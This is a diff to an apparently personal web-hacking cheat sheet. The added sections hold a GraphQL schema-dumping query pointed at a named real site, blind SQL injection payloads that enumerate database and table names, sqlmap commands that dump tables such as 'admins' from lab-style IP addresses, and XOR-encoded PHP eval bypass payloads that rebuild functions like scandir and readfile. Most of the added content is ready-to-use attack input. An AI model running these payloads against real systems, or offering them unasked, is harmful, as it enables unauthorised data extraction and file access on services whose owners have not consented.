@@ -287,6 +287,8 @@ and best part is sometimes does auto suggestion which just makes it easier. we w
 
 ## Exploiting
 
+### Method 1
+
 suppose you find a endpoint with no knowledge wht query should be passed so lets begin there
 
 testing if its valid endpoint
@@ -344,6 +346,21 @@ suppose the above query didnt worked and we can only query username
 < {"data":{"user":{"username":"helpme@helpme.com"}}}
 ```
 
+
+### Method 2
+
+```
+https://app.zety.com/graphql?query={__schema%20{%0atypes%20{%0aname%0akind%0adescription%0afields%20{%0aname%0a}%0a}%0a}%0a}
+
+```
+
+this might dump schema of every table with columns
+
+
+now simply query .
+```
+https://app.zety.com/graphql?query={table {column1,column2} }
+```
 
 ## Smart Attack Vectors
 
@@ -676,8 +693,6 @@ Limiting the number of requests made from client to server to avoid brute forcin
 # SQL Injection
 
 
-
-
 ## MSSQL Injection
 
 [if stacked queries are enabled]
@@ -692,7 +707,7 @@ Limiting the number of requests made from client to server to avoid brute forcin
 
 
 
-## sql-ite injection with not allowed > spaces ' " union select
+## sqlite injection with not allowed > spaces ' " union select
 
 * `%0a` to make spaces
 * `unUnionion` string cutting because it was replacing our input
@@ -766,6 +781,36 @@ or:
 ## advance MySQL table and column names
 
 [LINK TO WRITEUP](./docx/sql1.pdf)
+
+## BLIND Injection
+
+```
+Getting database info
+> id=1
+> id=1' OR LENGTH(database())=6 #   ( get length of name of db)
+> id=1' OR database() LIKE '______'#  ( brute force a-Z 0-9 we get database name 'level2' )
+
+```
+
+``` 
+Getting tables info
+> id=1' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=2# count of tables
+> id=1' OR (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) = 6 #  1st table name length 
+> id=1' OR (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1) LIKE '_____'#   ( brute force a-Z 0-9 we get table name 'pages' )
+```
+
+Now we can just use sqlmap
+
+`sqlmap -u "http://35.237.57.141:5001/b09a24aa14/fetch?id=2" --method GET --dump -D level5 -T photos --random-agent --threads 10`
+
+OR
+
+Enum database
+` sqlmap -u http://35.237.57.141:5001/352b4bc136/login --method POST --data "username=FUZZ&password=" -p username --dbs --dbms mysql --regexp "invalid password" --level 2 `
+ENum Table
+`sqlmap -u http://35.237.57.141:5001/352b4bc136/login --method POST --data "username=FUZZ&password=" -p username --table -D level2 --dbms mysql --regexp "invalid password" --level 2`
+Dump Table value
+`sqlmap -u http://35.237.57.141:5001/352b4bc136/login --method POST --data "username=FUZZ&password=" -p username --dump -D level2 -T admins --dbms mysql --regexp "invalid password" --level 2`
 
 
 
@@ -1581,7 +1626,29 @@ $_=($_^"<").($_^">;").($_^"/");
 * htmlspecialchars
 	* doesnt encode single quote ' until specified
 
+## PHP eval bypasses
 
+if user input is highly sanitized and passed into eval , we can use techniqe below to create dangerous payloads
+
+```
+/*
+* $payload = "(%ff%ff)^(%d1);";  ===> results in "." 
+* $payload = "(%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f);"; => scandir
+* $payload = "(%ff%ff%ff%ff%ff%ff%ff)^(%8f%9e%96%96%8c%a0%9e)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f);"; => print_r
+* $payload = "((%ff%ff%ff%ff%ff%ff%ff%ff)^(%8d%9a%9e%9b%9b%96%91%9a)^(%ff%ff%ff%ff%9e%ff%9e%ff)^(%ff%ff%ff%ff%9c%ff%9c%ff));"; => readfile
+* $payload = "IBBCBBBB%5ENIMIIICI%5Eunnnmbmn;";  => small version of scandir
+* $payload = "C%5Ei;"; => *
+* $payload = "BBBB%5EICCC%5Elmnc;"; => glob
+*/
+
+$payload = "(%ff%ff%ff%ff%ff%ff%ff)^(%8f%9e%96%96%8c%a0%9e)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f);";
+
+
+$decoded_payload = urldecode($payload);
+echo $decoded_payload;
+
+
+```
 
 
 # Node/JS
